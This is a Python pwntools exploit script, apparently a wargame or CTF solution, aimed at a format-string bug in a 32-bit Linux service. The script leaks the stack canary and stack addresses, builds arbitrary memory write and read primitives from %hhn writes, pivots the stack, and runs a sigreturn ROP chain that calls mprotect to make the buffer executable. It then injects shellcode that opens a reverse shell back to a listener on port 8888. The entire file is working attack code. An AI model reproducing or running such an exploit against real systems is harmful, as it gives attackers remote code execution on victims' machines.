#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

SHELLCODE = asm(shellcraft.findpeersh())

r = remote('localhost', 20002)
r.readline()

# Canary = %134$
# ebp (0xffd2da98) = %137$
# ret addr (0x56557d4b) = %138$
# socket = %139$

# fmt base (0x56557000) = ret_addr - 0xd4b
# buffer addr (0xffd2d86c) = ebp - 556
# addr of ret (0xffd2da7c) = ebp - 28

r.sendline(flat(
    '%134$08x', # Canary
    '%137$08x', # EBP1
    '%138$08x', # ret addr
    '%139$08x', # socket
    '%145$08x', # EBP2
    '%157$08x'  # EBP3
))

canary     = int(r.recv(8), 16)
ebp1       = int(r.recv(8), 16)
ret        = int(r.recv(8), 16)
socket     = int(r.recv(8), 16)
ebp2       = int(r.recv(8), 16)
ebp3       = int(r.recv(8), 16)
fmt_base   = ret - 0xd4b
buffer     = ebp1 - 556
ret_addr   = ebp1 - 28
r.recvline()

def send_receive(fmt):
    r.sendline(fmt)
    return r.recvline()

def make_pointer(addr):
    send_receive('A' * ((ebp2 & 0xff) + 0)   + '%137$hhn')
    send_receive('A' * ((addr >>  0) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 1)   + '%137$hhn')
    send_receive('A' * ((addr >>  8) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 2)   + '%137$hhn')
    send_receive('A' * ((addr >> 16) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 3)   + '%137$hhn')
    send_receive('A' * ((addr >> 24) & 0xff) + '%145$hhn')

def poke(addr, data):
    for i in range(len(data)):
        make_pointer(addr + i)
        send_receive('A' * data[i] + '%157$hhn')

def peek(addr):
    make_pointer(addr)
    r.sendline('%157$sTHE_END')
    return r.recvuntil('THE_END\n')[:-8] + b'\0'

payload = asm(
            shellcraft.connect(util.net.interfaces4()[b'docker0'][0], 8888) +
            shellcraft.dupsh('edx')
        )

PAGE_SIZE  = 0x1000
PAGE_MASK  = ~(PAGE_SIZE-1)

add_esp_44 = fmt_base + 0x00000d13 # add esp, 0x44 ; pop ebx ; pop ebp ; ret

POP_EAX    = fmt_base + 0x00000d7b # pop eax ; ret
INT_80     = fmt_base + 0x00000e88 # int 0x80 ; ret

# Stack pivot
poke(ret_addr, p32(add_esp_44))

# Sigreturn ROP chain
# eax = SYS_mprotect
# ebx = addr
# ecx = len
# edx = PROT_READ | PROT_WRITE | PROT_EXEC
rop_addr = ret_addr + 0x44 + 12
rop_chain = flat(POP_EAX, int(constants.SYS_sigreturn), INT_80)

f = SigreturnFrame(kernel = 'amd64')
f.eax = constants.SYS_mprotect
f.ebx = buffer & PAGE_MASK
f.ecx = PAGE_SIZE * 2
f.edx = 7
f.esp = rop_addr + len(rop_chain) + len(str(f))
f.eip = INT_80

rop_chain += flat(str(f), buffer)

poke(rop_addr, rop_chain)
r.sendline(payload)

shell = listen(8888)
r.close()
shell.wait_for_connection()
shell.interactive()
